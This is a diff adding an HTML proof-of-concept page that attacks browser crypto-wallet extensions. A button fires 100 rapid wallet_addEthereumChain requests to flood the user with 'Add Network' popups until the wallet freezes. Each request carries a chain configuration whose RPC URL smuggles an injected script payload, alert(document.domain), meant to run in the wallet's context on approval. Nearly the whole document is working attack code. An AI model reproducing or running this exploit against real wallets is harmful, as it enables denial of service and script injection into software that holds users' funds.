@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Extension DoS Test</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #f87171; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
+    button {
+      width: 70%;
+      height: 15vh;
+      font-size: 40px;
+      background: #f6851b;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(246,133,27,0.6);
+      margin-top: 40px;
+    }
+    button:hover {
+      background: #e2761b;
+    }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>uXSS + DoS PoC</h1>
+    <p>Click the button to spam 100+ wallet_addEthereumChain requests in one click.</p>
+    <p class="warn">Warning: This will spam "Add Network" popup nonstop → wallet freeze/crash + alert(domain) on approve.</p>
+    <pre id="output">Ready. Click the button to start massive DoS + UXSS.</pre>
+    <button onclick="startMassiveAddChain()">START DoS ATTACK</button>
+  </div>
+
+  <script>
+    // CONFIG
+    const ADD_CHAIN_COUNT = 100; // Spam 100+ add chain requests
+    const DELAY_MS = 50; // Delay minimal untuk popup spam maksimal
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Malicious chain config with XSS in RPC URL
+    const evilChain = {
+      chainId: "0x31339",
+      chainName: "Evil Ethereum",
+      rpcUrls: ['https://rpc-mumbai.matic.today/x"+alert(document.domain)+"'],
+      nativeCurrency: {
+        name: "Evil",
+        symbol: "EVIL",
+        decimals: 18,
+      },
+      blockExplorerUrls: ["https://explorer-mumbai.maticvigil.com"],
+    };
+
+    // Mock wallet_addEthereumChain for testing
+    function mockAddChain(index) {
+      log(`Mock add chain #${index} triggered`);
+      return Promise.resolve("mock_success");
+    }
+
+    // Real wallet_addEthereumChain with fallback
+    async function tryAddChain(index) {
+      if (!window.ethereum || !window.ethereum.request) {
+        log(`No wallet detected — using mock for #${index}`);
+        return mockAddChain(index);
+      }
+
+      try {
+        const result = await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [evilChain]
+        });
+        log(`Real add chain #${index} success: ${result}`);
+        return result;
+      } catch (err) {
+        log(`Add chain #${index} rejected/failed: ${err.message || err}`);
+        return mockAddChain(index);
+      }
+    }
+
+    // Massive addEthereumChain spam (DoS + UXSS)
+    async function startMassiveAddChain() {
+      outEl.textContent = '';
+      log('Starting massive wallet_addEthereumChain spam (100+ requests)...');
+
+      for (let i = 1; i <= ADD_CHAIN_COUNT; i++) {
+        log(`Triggering add chain request #${i}...`);
+        await tryAddChain(i);
+        await new Promise(resolve => setTimeout(resolve, DELAY_MS)); // Delay kecil biar popup spam maksimal
+      }
+
+      log('Massive DoS + UXSS attempt completed.');
+      alert("DoS finished. If user approved any, alert(document.domain) executed in wallet context!");
+    }
+  </script>
+</body>
+</html>
